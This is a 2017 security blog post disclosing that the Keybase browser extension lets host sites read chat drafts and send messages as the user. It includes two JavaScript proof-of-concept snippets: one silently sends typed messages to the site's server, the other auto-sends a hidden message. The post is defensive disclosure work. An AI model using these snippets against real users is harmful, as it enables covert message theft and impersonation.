---
title: "Keybase Browser Extension Insecure"
date: Sat, 05 Aug 2017 10:26:45 GMT
draft: false
type: posts
---
# Keybase Browser Extension Insecure





Yesterday, I discovered that Keybase has a browser extension for both Firefox and Chrome. It activates whenever you land on a profile page on keybase.io, or a website which Keybase uses for proofs (currently Reddit, Twitter, Facebook, Github, Hacker News). It places a “Keybase Chat” button on the page. When

Yesterday, I discovered that [Keybase](https://keybase.io) has a browser extension for both [Firefox](https://firefox.com) and Chrome. It activates whenever you land on a profile page on keybase.io, or a website which Keybase uses for proofs (currently Reddit, Twitter, Facebook, Github, Hacker News). It places a “Keybase Chat” button on the page. When you press this button, a compose window opens, you enter a message, and then the addon contacts your keybase desktop app in order to send a message to that user.

If you are lucky enough to discover the extension by visiting [https://keybase.io/docs/extension](https://keybase.io/docs/extension) and by actually reading the content of the page, you will come across this little bit of information:

> “The Keybase extension uses a compose box inside your browser. If you fear your browser or the social network site’s JavaScript has been compromised – say by another extension or even the social network acting fishy – then just compose the message inside the Keybase app directly. Or send a quick hello note through the extension and save the jucier private details for inside the app.”

This information is **not** on the Firefox or Chrome extension stores.

But what does it _actually_ mean?

It means that Reddit, Twitter, Facebook, Github, Hacker News, Keybase and any other site that they allow to execute JavaScript on their pages can perform the following actions if you visit their websites with the addon installed:

1.  Read any message that you type into the compose box, as you’re typing it.
2.  Send chat messages from you to other Keybase users.

For #1, to read the messages you are composing they simply need to serve up a small amount of JavaScript similar to the following when you visit:

```
if (document.querySelector('.keybase-chat')) {
  let msg = '';
  setInterval(() => {
    const t = document.querySelector('.keybase-reply textarea');
    if (!t || t.value.length === 0 || t.value === msg) return;
    msg = t.value;
    fetch('/report-keybase-chat?msg=' + encodeURIComponent(msg));
  }, 1000);
}
```

In the above code, the first line detects if the user has the keybase addon. If they do, it runs a check on a 1 second interval to see if there is a Keybase composer window open with a message in it. If there is, and the message being composed is different to what it was 1 second ago, then an ajax request is performed to send the content of that message to the server.

For #2, to send a message to a keybase user silently:

```
function sendKeybaseMessage(msg) {

  const s = document.createElement('style');
  s.type = 'text/css';
  s.textContent = '.keybase-reply{opacity:0 !important}';
  document.head.appendChild(s);

  document.querySelector('.keybase-chat').click();
  document.querySelector('.keybase-reply textarea').value = msg;
  const event = new UIEvent('change', { view: window, bubbles: true, cancelable: true });
  document.querySelector('.keybase-reply textarea').dispatchEvent(event);
  document.querySelector('.keybase-reply input[name="keybase-submit"]').click();
  document.querySelector('.keybase-close').click();
  s.remove();

}
```

The “style” related code is there to make sure that the user doesn’t notice the compose window opening and being filled with a message, and the message being sent, by making it invisible temporarily. To specify a recipient other than the one in the profile being viewed, a little more work would need to be done by the server to temporarily redirect you to a different profile page, but it would work.

The troubling thing is, they could actually have made this secure. As well as the chat functionality that they inject into the browsers DOM, they also add a Keybase icon into the browser UI it’s self, outside of the DOM. Clicking on that icon works exactly the same, except it doesn’t inject anything into the DOM, the compose window is outside of the webpage, making it obvious that the browser is in control rather than the webpage. The textarea can not be read and it can not be interacted with from JavaScript.

**Conclusion** : Continue installing and using the excellent desktop app. Don’t even think about installing the browser addon.

[![](https://www.grepular.com/images/amazon/yubikey_nano.jpg)](https://www.grepular.com/redir?key=amazon_yubikey_nano "Yubikey Nano") [![](https://www.grepular.com/images/amazon/saving_bletchley_park.jpg)](https://www.grepular.com/redir?key=amazon_saving_bletchley_park "Saving Bletchley Park")

#### [Source](https://www.grepular.com/Keybase_Browser_Extension_Insecure)

